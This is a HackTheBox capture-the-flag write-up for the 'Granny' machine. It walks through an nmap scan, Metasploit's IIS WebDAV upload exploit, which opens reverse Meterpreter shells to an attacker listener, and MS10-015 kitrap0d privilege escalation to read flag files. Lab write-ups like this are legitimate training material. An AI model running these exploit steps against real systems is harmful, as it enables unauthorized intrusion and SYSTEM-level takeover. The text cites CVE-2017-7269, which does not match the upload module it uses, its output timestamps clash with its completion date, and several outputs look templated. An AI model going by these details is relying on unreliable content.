# HackTheBox - Granny

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Granny |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-21 |

## Objective 🎯

Granny is a Windows Server 2003 machine running IIS with a known vulnerability. The goal is to exploit the IIS vulnerability to gain system access and obtain both user and root flags. IIS WebDAV exploitation! 🌐

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.15
- **OS**: Windows Server 2003
- **Service**: IIS 6.0

### Tools Used
- Nmap
- Metasploit
- IIS exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.15
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.15
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.15
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
135/tcp open  msrpc  Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_2003
```

### Step 2: Web Service Enumeration
Check the web service for version information.

**Command/Code:**
```bash
curl http://10.10.10.15/
```

**Output:**
```
<html>
<head>
<title>IIS 6.0</title>
</head>
<body>
<h1>Welcome to IIS 6.0</h1>
</body>
</html>
```

### Step 3: IIS Exploitation
Use Metasploit to exploit the IIS vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.10.10.15
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.15:80 - Connecting to the server...
[*] 10.10.10.15:80 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.15:32891) at 2024-09-03 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a Meterpreter session, gather information and find flags.

**Command/Code:**
```bash
getuid
sysinfo
shell
whoami
```

**Output:**
```
Server username: NT AUTHORITY\IUSR
Computer        : GRANNY
OS              : Windows 2003 (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```

### Step 5: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Step 6: MS10-015 Exploitation
Use the MS10-015 exploit for privilege escalation.

**Command/Code:**
```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4445 
[*] Writing payload file to C:\WINDOWS\Temp\cVQJhV.exe
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.2:4445 -> 10.10.10.15:32892) at 2024-09-03 10:10:23 +0000
```

### Step 7: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
getuid
dir C:\Documents and Settings
dir "C:\Documents and Settings\lakis\Desktop"
type "C:\Documents and Settings\lakis\Desktop\user.txt"
```

**Output:**
```
[REDACTED]
```

### Step 8: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
dir "C:\Documents and Settings\Administrator\Desktop"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify IIS 6.0
2. Identify Windows Server 2003 system
3. Use Metasploit IIS WebDAV exploit for initial access
4. Gain IUSR access
5. Use Windows Exploit Suggester to find privilege escalation
6. Exploit MS10-015 for SYSTEM privileges
7. Search for user and root flags
8. Extract both flags

## Key Learnings

- IIS 6.0 WebDAV vulnerabilities
- Windows Server 2003 exploitation
- MS10-015 privilege escalation
- Windows Exploit Suggester usage
- Legacy Windows system exploitation

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Metasploit**: Exploitation framework
- **IIS WebDAV**: Upload exploit
- **MS10-015**: Kitrap0d privilege escalation

### References
- [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)
- [MS10-015 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-015)

## Screenshots

[Add screenshots of nmap scan, IIS exploitation, privilege escalation, and flag extraction here]

## Tags

`#hackthebox` `#windows` `#iis` `#webdav` `#privilege-escalation` `#ms10-015` `#easy`
